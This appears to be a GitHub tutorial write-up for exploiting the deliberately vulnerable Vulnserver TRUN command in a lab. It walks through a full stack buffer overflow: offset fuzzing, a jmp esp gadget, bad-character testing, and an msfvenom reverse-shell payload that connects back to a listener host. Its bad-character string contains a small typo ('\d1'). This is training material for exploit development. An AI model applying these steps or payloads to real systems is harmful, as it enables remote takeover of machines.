# Vulnserver-TRUN-ReverseShell

- YOU WILL NEED ALOT OF RESTARTING IN CHALLENGES LIKE THIS. Restarting your binary or vm is completely normal and recommend throughout your journey to code execution.
- The goal from this challenge is get a reverse shell to our linux machine as the user running the process (mine will be called MALDEV01)
- Requirements for this challenge is a Windows VM with Windbg (I will be using the old version, but the new one should be fine), and a linux machine to catch the shell and generate the shellcode.
- Hopefully this challenge should be easy to understand for anyone that never done windows binary exploitation.
- We will be doing "TRUN .", which has no mitigations. Some mitigations that can be seen in other prefixes are stuff like SEH, DEP, etc.


# 0x00. Introduction :

To download vulnserver, go to the following link and download the binary : https://github.com/stephenbradshaw/vulnserver/blob/master/vulnserver.exe
We will be analysing the source code more than the reverse engineered code for educational purposes, if you wish a challenge, try to reverse it and figure it out.

After you downloaded it on your windows machine, you will need to run it :

<img width="1147" height="295" alt="image" src="https://github.com/user-attachments/assets/a5766664-fcbd-4718-9ef1-a05bbfdfb0f0" />


Now, assuming you already downloaded windbg, **you will need to attach the process to windbg by going to file and then attach to process**. This can be found in the new and older version :

<img width="619" height="324" alt="image" src="https://github.com/user-attachments/assets/39fcb95c-14ad-48df-89b9-40506413ee4b" />


In the newer versions of windbg, you will find the process called "vulnserver.exe" as the first or second process in the list. In my version, we will find in the end of the list : 

<img width="533" height="562" alt="image" src="https://github.com/user-attachments/assets/8cb1cf5f-c142-4dca-8de3-b28502b82696" />

And then press "Ok".

You should now see something like this :

<img width="1306" height="833" alt="image" src="https://github.com/user-attachments/assets/dff886ee-0aac-41ca-a741-7dd62325ccb8" />


You can also add disassembly, memory, etc. But I will now dive into exploitation directly.

# 0x01. Smashing the stack!

We will first need to fuzz the offset. The offset is here is how many bytes/characters to do we need to add to the buffer to overwrite the EIP pointer. EIP stands for the Instruction pointer, where the 'E' indicates a x86 bit register.

There are alot of ways to fuzz for the offset. What i will use is msf-pattern_create and msf-pattern_offset on my kali linux machine :

```
msf-pattern_create -l 4000 > exp.py
```

<img width="845" height="754" alt="image" src="https://github.com/user-attachments/assets/bdaae70e-0530-4fe2-92ac-c19800f84416" />


We can now open exp.py and organize everything we need to do.
To ensure organization, you need to do the following :

- connect to the target
- create the buffer
- send the buffer
- debug the output

Although this might seem as alot, we are not here to make seem hard.

To connect to the target, we can use pwntools using the following syntax :

```
from pwn import *

io = remote("192.168.225.159", 9999) 
# this is basically how to connect
```

Where 9999 is the port that the vulnserver will be running on.
We already created to buffer we are going to send, and the reason why we used msf to createt it is because we will be overwriting the EIP pointer, so once we overwrite it, it will contain a specific part that was in our buffer, hence, we can copy what eip stopped at and from there check for the offset using msf-pattern_offset -l 4000 -q <paste-eip>.

Before we go any further, we need to analyze the source code found here : https://github.com/stephenbradshaw/vulnserver/blob/master/vulnserver.c 

Look at line 204 :

			} else if (strncmp(RecvBuf, "TRUN ", 5) == 0) {
				char *TrunBuf = malloc(3000);
				memset(TrunBuf, 0, 3000);
				for (i = 5; i < RecvBufLen; i++) {
					if ((char)RecvBuf[i] == '.') {
						strncpy(TrunBuf, RecvBuf, 3000);				
						Function3(TrunBuf);
						break;
					}
				}

This basically tells us that, if we add a dot : "." after the 5 characters with TRUN including the space "TRUN ", the code will copy our buffer and put it in TrunBuf using the vulnerable function called 'strncpy'.

So, to achieve we want, which is a shell, which is execution of code in the stack, we will need to send the number of bytes to the offset, and leave the eip for the 'jmp esp' gadget (I will explain this now), and then add our buffer.

Now to visualize this, I will need to explain what NOPs are too. 

So 'jmp esp' in assembly means the following. "esp" represents the Stack Pointer. "jmp" here means Jump to the first paramter, which is expected to e register. So we are bascially saying, Jump to stack. Once we do that, our shellcode will already be found there, hence executing it. Incase you are wondering now, the shellcode will be generate with msfvenom.

And "NOP" of "\x90" is just a byte that doesn't do anything. It's used for padding, meaning readjusting the start/finish/postition of the pointer to start where you want it to be. It's just a byte that takes up space to execute what you want.

You might be wondering, why do we need it ?  We need it because when we jump to stack (and this something you need to know), we don't always start at the top of the stack or esp. There is almost alwyas a small constant slip that can be a few bytes earlier, which if it does happen, can execute bytes inside the "decoder" stub instead of the first byte of your shellcode, missing up your execution leading to an access violation.

Now that we have a good idea about all the concepts, let't actually start smashing the stack.

So after running this command : 

```
msf-pattern_create -l 4000 > exp.py
```

We will declare a variable that will hold it, let's call it payload :


<img width="746" height="149" alt="image" src="https://github.com/user-attachments/assets/dc576eab-d41f-4a45-936f-6fa999999175" />


But this is wrong, we need to first add the string in 1 quotations and add a "b" before them, indicating we are sending byte objects.

Like this :


<img width="530" height="142" alt="image" src="https://github.com/user-attachments/assets/90d1d889-65bc-497b-a31d-e3e88d79662e" />


Now, To send our bytes correctly, we need to add the correct prefix, being "TRUN .", this will change our code a bit :

```python
payload = b'TRUN .'
payload += b'Aa0......' # where the payload += means add the to the TRUN .Aa0...
```
 Now, to send these bytes, we will use pwntools to send it using io.sendline, where io is the variable the holds the connection :

```
io.sendline(payload)
```

Which should look like this in the end :


<img width="658" height="155" alt="image" src="https://github.com/user-attachments/assets/c3ef2f50-89a3-4ee2-a339-d123196edcf4" />


After running exp.py, ensuring that windbg is attached (u might need to restart windbg and vulnserver), you should be met with this Access Violation :


<img width="656" height="139" alt="image" src="https://github.com/user-attachments/assets/4b918443-e76e-42e0-ac31-f8e8f020e4a8" />


Looking at EIP, we see that it holds a value, if u find this output to be messy, you might need to use this command : `r eip` where 'r' represents Register and the second parameter is a filter parameter by register :

<img width="687" height="145" alt="image" src="https://github.com/user-attachments/assets/04435429-9cba-4841-a691-b000f17c880c" />

We copy this value to our kali machine and run msf-patttern_offset with it  (396f4338) :

<img width="444" height="117" alt="image" src="https://github.com/user-attachments/assets/b64c6fff-d9fa-405c-bdb7-4da68a8798f7" />


We now know our offset is at 2006, Perfect.

For the next step, we need to find the 'jmp esp' gadget. it can also be a 'call esp' gadget too.

In the same access violation page, we need to run the following, which will be explaining. 

First, run 'lm', which means "list modules":

<img width="530" height="171" alt="image" src="https://github.com/user-attachments/assets/ce674ba1-d51d-418e-bf8c-42d950432338" />

What will interest us is essfunc, because it is the dll that is linked to the vulnserver binary, it contains custom added asm functions if you look here : https://github.com/stephenbradshaw/vulnserver/blob/master/essfunc.c

<img width="996" height="700" alt="image" src="https://github.com/user-attachments/assets/66ec3a9a-85e5-4903-9bee-0e8075195da6" />


Which is our interest.

Now, we will search for jmp esp. jmp esp in hex (can be found by searching) is FF E4.

Windbg has search command, and the syntax is as follows :

```
s -b <start> <end> byte1 byte2 .. .. ..  
```

"s" means search, "b" indicates "in the following range". start and end are what are shown in the image below :

<img width="465" height="233" alt="image" src="https://github.com/user-attachments/assets/823cbe40-8c17-4ee3-8aad-1366cd2be303" />

and for the bytes of our interest, we want ff e4.

So our full command will look like this :

```
s -b 62500000 62508000 ff e4 
```

And we see the following :


<img width="684" height="290" alt="image" src="https://github.com/user-attachments/assets/d9b37655-7529-435f-a376-cafceecc4d88" />

All of these addresses are valid 'jmp esp' addresses, you can use whatever you wish.

Since we now know the offset is 2006, let's create a variable and add 2006 A's for padding until the eip pointer :

<img width="504" height="241" alt="image" src="https://github.com/user-attachments/assets/760a17fa-b3e2-4dee-b2fe-66e7a086a07c" />

We also got the jmp esp gadget. We will add it right after the A's because the the next 4 bytes after the A's will be held in the EIP pointer. so we will add one of the address we talked about earlier :

<img width="381" height="260" alt="image" src="https://github.com/user-attachments/assets/f8dcc14b-a57b-4cdb-9cbf-84033d2d29d1" />


Where p32() means pack into 32 bits, which means 4 bytes. Which is exactly what we need!

# 0x02. Bad Characters

Before we actually send our shellcode, we need to check for bad characters. If these are characters were to be sent, will cause the payload to be malformed or not function as intended.

So we obviously need to check it for it before we execute anything... 

So, to do this, we need to add the following to our code :

```
badchar = b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\d1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

And personally, I will add it after the JMP ESP gadget : 

<img width="810" height="241" alt="image" src="https://github.com/user-attachments/assets/0ccceddd-60ac-4237-9423-47399561052c" />

Running it with vulnserver + Windbg running :

<img width="1700" height="619" alt="image" src="https://github.com/user-attachments/assets/9698042a-af49-4a5f-ba49-e89388d3f33f" />

We see that it starts with '00' and then 48, where our "badcharacter" variable had all possible characters.

Now that we know that \x00 is a bad character, let's get to the point :

- A general rule from now on is the \x00 is always a bad character
- Stuff like \x0A, which is \n, which is a line break is bad, and the list goes on.

To confirm the \x00 was actually the bad character, let's run badcharacters without \x00 in the beginning like this :

```
badchar = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\d1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

<img width="712" height="276" alt="image" src="https://github.com/user-attachments/assets/77b36d64-8c2f-4404-b4a8-40e50223e288" />


Restarting vulnserver with windbg and running the poc, we should see that all letters and characters should appear like shown :


<img width="1636" height="714" alt="image" src="https://github.com/user-attachments/assets/2043c4a5-1a31-478a-8d45-255fa8c0ce5a" />

We see everything from \x01 to \xff, this means that \x00 was indeed the only bad character.

If you can't see the memory, you might need to go here : 

<img width="874" height="446" alt="image" src="https://github.com/user-attachments/assets/f4ba5764-f2c2-4109-a989-a8f0975e367e" />

And press "enter".

Or, delete everything and type "@eip" :

<img width="1089" height="352" alt="image" src="https://github.com/user-attachments/assets/cc473824-b152-4de1-9a46-0c40f6cda683" />

Why eip ? because it's the instruction pointer and we overwrote it.

Hopefully that was clear.

# 0x03. Jumping to shellcode!

For our final step, we need the shellcode we will use to get the reverse shell, this can easily be done using msfvenom :

```
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.225.128 LPORT=4444 -b \x00 -e x86/shikata_ga_nai -f python
```

- `-b` here means "exclude the following characters", and since we knew that \x00 was a bad character, msfvenom will generate shellcode ignoring that byte.
  
Where LHOST is your linux IP and LPORT is your listener IP (to catch the shell) :

<img width="698" height="661" alt="image" src="https://github.com/user-attachments/assets/f4630672-0230-4de5-bb1c-d1f2ffe6e20e" />

Copy it and add to the script of ours, and add it to the payload after the 'jmp esp' :

<img width="551" height="628" alt="image" src="https://github.com/user-attachments/assets/6a853e1c-f4e7-4730-8f1b-d7bd2462b200" />

We are now ready to get the shell, but we have only one problem. 

When we talked about nops earlier, we said that when we jump to ESP, we don't exactly start at byte 0 or on top of it. There is always some bytes that comes before it ruining our execution flow.

So, since we said add nops "after jumping to the stack", we mean add it after the pointer. So it should be before our buffer and after the "jmp esp" address.

But how much ? Usually it varies, but adding 16 or more nops is always guaranteed to work almost everytime!

Let's now add it and see :

<img width="536" height="735" alt="image" src="https://github.com/user-attachments/assets/daa82797-0a5e-4fd1-8ef1-9673ef414bd0" />


Make sure to use io.send(payload) and not sendline.


Running the exploit, we get a shell as maldev01 !!!

<img width="937" height="425" alt="image" src="https://github.com/user-attachments/assets/2edbb45a-e5b5-4a4a-a547-db5d0e0b50af" />

# 0x04. NOPs don't matter

Going back to our NOP point. we here have 16 nops. If we make them 30 or 40 or 50 it won't matter, let's try 40 :


<img width="1499" height="833" alt="image" src="https://github.com/user-attachments/assets/f729710b-074c-41e5-b996-3ed31e414c75" />


More NOPs ? let's do 100 :

<img width="1411" height="394" alt="image" src="https://github.com/user-attachments/assets/89638358-a9bb-49f4-b211-02269fd42e9b" />

Hopefully this was easy and clear to understand. 
If you have any recommendations or suggestions, please consider DMing me.

Until next time!


